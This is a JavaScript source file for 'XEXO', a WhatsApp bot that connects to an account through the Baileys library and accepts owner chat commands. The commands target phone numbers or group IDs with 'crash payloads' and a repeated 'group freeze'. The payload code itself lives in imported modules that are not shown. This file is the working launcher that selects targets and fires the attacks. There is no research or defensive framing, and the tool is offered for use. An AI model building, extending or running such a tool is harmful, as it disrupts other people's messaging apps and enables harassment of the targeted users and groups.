/**
 * ╔═══════════════════════════════════╗
 * ║        XEXO  WhatsApp Bot        ║
 * ║  pair-code · Ubuntu Chrome · v2  ║
 * ╚═══════════════════════════════════╝
 *
 * 1. npm install
 * 2. Edit config.js → PAIRING_NUMBER
 * 3. node index.js  →  enter code on phone
 */

"use strict";

const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore,
  jidNormalizedUser,
} = require("@whiskeysockets/baileys");
const pino    = require("pino");
const qrcode  = require("qrcode-terminal");
const fs      = require("fs");
const CONFIG  = require("./config");

const { crashfinity } = require("./payloads/crashfinity");
const { crashjam }    = require("./payloads/crashjam");
const { stickerCrash }= require("./payloads/stickerCrash");
const { groupFreeze } = require("./payloads/groupFreeze");

// ── LOGGER ──────────────────────────────────────────────────────────────────
const logger = pino({ level: CONFIG.LOG_LEVEL || "silent" });

// ── STATE ────────────────────────────────────────────────────────────────────
let pairingRequested = false;
let defaultTarget    = CONFIG.DEFAULT_TARGET ? toJid(CONFIG.DEFAULT_TARGET) : null;

// ── HELPERS ──────────────────────────────────────────────────────────────────
function toJid(input) {
  if (!input) return null;
  const s = String(input).trim();
  if (s.includes("@")) return s;
  const clean = s.replace(/\D/g, "");
  return clean.length >= 7 ? `${clean}@s.whatsapp.net` : null;
}

function isOwner(jid) {
  if (!CONFIG.OWNERS?.length) return true;
  const n = jidNormalizedUser(jid);
  return CONFIG.OWNERS.some((o) => jidNormalizedUser(toJid(o) || o) === n);
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// ── MENU ─────────────────────────────────────────────────────────────────────
function buildMenu() {
  const p = CONFIG.PREFIX;
  return [
    "╔══════════════════════════════════╗",
    "║       𝕏 𝔼 𝕏 𝕆  𝔹 𝕆 𝕋  v2       ║",
    "╠══════════════════════════════════╣",
    "║  🎯  TARGETING                   ║",
    `║  ${p}target <number>             ║`,
    "║  set or view default target      ║",
    "╠══════════════════════════════════╣",
    "║  💥  CRASH PAYLOADS              ║",
    `║  ${p}crashfinity  <number>       ║`,
    `║  ${p}crashjam     <number>       ║`,
    `║  ${p}stickercrash <number>       ║`,
    "╠══════════════════════════════════╣",
    "║  ❄️   GROUP PAYLOADS             ║",
    `║  ${p}gcfreeze <jid> [rounds]     ║`,
    "║  rounds default: 8               ║",
    "╠══════════════════════════════════╣",
    "║  🔧  UTILS                       ║",
    `║  ${p}ping                        ║`,
    `║  ${p}status                      ║`,
    `║  ${p}menu                        ║`,
    "╚══════════════════════════════════╝",
    `target : ${defaultTarget || "not set"}`,
    `prefix : ${p}`,
  ].join("\n");
}

// ── AUTH ──────────────────────────────────────────────────────────────────────
async function startBot() {
  if (!fs.existsSync(CONFIG.SESSION_DIR)) {
    fs.mkdirSync(CONFIG.SESSION_DIR, { recursive: true });
  }

  const { state, saveCreds } = await useMultiFileAuthState(CONFIG.SESSION_DIR);
  const { version }          = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    version,
    auth: {
      creds: state.creds,
      keys:  makeCacheableSignalKeyStore(state.keys, logger),
    },
    logger,
    printQRInTerminal:           false,
    browser:                     CONFIG.BROWSER || ["Ubuntu", "Chrome", "20.0.04"],
    markOnlineOnConnect:         true,
    generateHighQualityLinkPreview: false,
    syncFullHistory:             false,
    connectTimeoutMs:            60_000,
    defaultQueryTimeoutMs:       60_000,
    keepAliveIntervalMs:         10_000,
  });

  sock.ev.on("creds.update", saveCreds);

  // ── CONNECTION ──────────────────────────────────────────────────────────────
  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect, qr } = update;

    if (qr && CONFIG.USE_PAIRING_CODE && !sock.authState.creds.registered && !pairingRequested) {
      pairingRequested = true;
      const phone = String(CONFIG.PAIRING_NUMBER || "").replace(/\D/g, "");

      if (!phone || phone.length < 8) {
        console.log("[XEXO] PAIRING_NUMBER invalid → QR fallback");
        qrcode.generate(qr, { small: true });
      } else {
        try {
          await sleep(1200);
          const code   = await sock.requestPairingCode(phone);
          const pretty = code?.match(/.{1,4}/g)?.join("-") || code;
          console.log("\n╔════════════════════════════╗");
          console.log("║   XEXO — PAIRING CODE      ║");
          console.log(`║       ${pretty.padEnd(20)}║`);
          console.log("╚════════════════════════════╝");
          console.log("WhatsApp → Settings → Linked Devices");
          console.log("→ Link a Device → Link with phone number\n");
        } catch (e) {
          console.error("[XEXO] pairing failed:", e.message);
          qrcode.generate(qr, { small: true });
        }
      }
    } else if (qr && !CONFIG.USE_PAIRING_CODE) {
      console.log("\n[XEXO] Scan QR:\n");
      qrcode.generate(qr, { small: true });
    }

    if (connection === "open") {
      console.log("\n╔══════════════════════════════╗");
      console.log("║   XEXO  Connected  ✓         ║");
      console.log(`║   Prefix  : ${CONFIG.PREFIX.padEnd(18)}║`);
      console.log(`║   Target  : ${(defaultTarget || "not set").padEnd(18)}║`);
      console.log("╚══════════════════════════════╝\n");
    }

    if (connection === "close") {
      const code      = lastDisconnect?.error?.output?.statusCode;
      const reconnect = code !== DisconnectReason.loggedOut;
      console.log(`[XEXO] closed (${code}) reconnect=${reconnect}`);
      pairingRequested = false;
      if (reconnect) startBot();
      else {
        console.log("[XEXO] logged out — delete session dir and restart");
        process.exit(1);
      }
    }
  });

  // ── COMMAND ROUTER ──────────────────────────────────────────────────────────
  sock.ev.on("messages.upsert", async ({ messages, type }) => {
    if (type !== "notify") return;

    for (const msg of messages) {
      try {
        if (msg.key.fromMe)                          continue;
        if (msg.key.remoteJid === "status@broadcast") continue;

        const jid  = msg.key.remoteJid;
        const text =
          msg.message?.conversation ||
          msg.message?.extendedTextMessage?.text || "";

        if (!text.startsWith(CONFIG.PREFIX))         continue;
        if (!isOwner(jid))                           continue;

        const body    = text.slice(CONFIG.PREFIX.length).trim();
        const [cmd, ...args] = body.split(/\s+/);
        const command = (cmd || "").toLowerCase();
        const arg1    = args[0] || "";
        const arg2    = args[1] || "";

        const reply = (t) => sock.sendMessage(jid, { text: t }, { quoted: msg });

        // ── UTILS ─────────────────────────────────────────────────────────────
        if (command === "menu" || command === "help") {
          await reply(buildMenu());
          continue;
        }

        if (command === "ping") {
          const t0 = Date.now();
          await reply(`pong — ${Date.now() - t0}ms`);
          continue;
        }

        if (command === "status") {
          await reply(
            `╔═ XEXO STATUS ═══════════╗\n` +
            `║ target : ${(defaultTarget || "not set").padEnd(16)}║\n` +
            `║ prefix : ${CONFIG.PREFIX.padEnd(16)}║\n` +
            `║ uptime : ${Math.floor(process.uptime())}s`.padEnd(27) + `║\n` +
            `╚═════════════════════════╝`
          );
          continue;
        }

        // ── TARGETING ─────────────────────────────────────────────────────────
        if (command === "target") {
          if (!arg1) {
            await reply(`current target: ${defaultTarget || "not set"}\nusage: ${CONFIG.PREFIX}target 15551234567`);
            continue;
          }
          const t = toJid(arg1);
          if (!t) {
            await reply(`invalid number: ${arg1}`);
            continue;
          }
          defaultTarget = t;
          await reply(`✓ target set → ${t}`);
          continue;
        }

        const resolveTarget = () => toJid(arg1) || defaultTarget;

        // ── CRASH PAYLOADS ────────────────────────────────────────────────────
        if (command === "crashfinity") {
          const t = resolveTarget();
          if (!t) { await reply("no target — use .target or pass number"); continue; }
          await reply(`⚡ crashfinity → ${t}`);
          try   { await crashfinity(sock, t); await reply("✓ sent"); }
          catch (e) { await reply(`✗ ${e.message}`); }
          continue;
        }

        if (command === "crashjam") {
          const t = resolveTarget();
          if (!t) { await reply("no target — use .target or pass number"); continue; }
          await reply(`⚡ crashjam → ${t}`);
          try   { await crashjam(sock, t, 5); await reply("✓ sent"); }
          catch (e) { await reply(`✗ ${e.message}`); }
          continue;
        }

        if (command === "stickercrash") {
          const t = resolveTarget();
          if (!t) { await reply("no target — use .target or pass number"); continue; }
          await reply(`⚡ stickercrash → ${t}`);
          try   { await stickerCrash(sock, t); await reply("✓ sent"); }
          catch (e) { await reply(`✗ ${e.message}`); }
          continue;
        }

        // ── GROUP PAYLOADS ────────────────────────────────────────────────────
        if (command === "gcfreeze") {
          const g      = arg1.includes("@") ? arg1 : null;
          const rounds = parseInt(arg2, 10) || 8;
          if (!g) {
            await reply(`usage: ${CONFIG.PREFIX}gcfreeze 120363...@g.us [rounds]`);
            continue;
          }
          await reply(`❄️ gcfreeze → ${g} (${rounds} rounds)`);
          try   { await groupFreeze(sock, g, rounds); await reply("✓ sent"); }
          catch (e) { await reply(`✗ ${e.message}`); }
          continue;
        }

      } catch (err) {
        console.error("[handler]", err.message);
      }
    }
  });
}

// ── BOOT ─────────────────────────────────────────────────────────────────────
startBot().catch((e) => {
  console.error("[FATAL]", e);
  process.exit(1);
});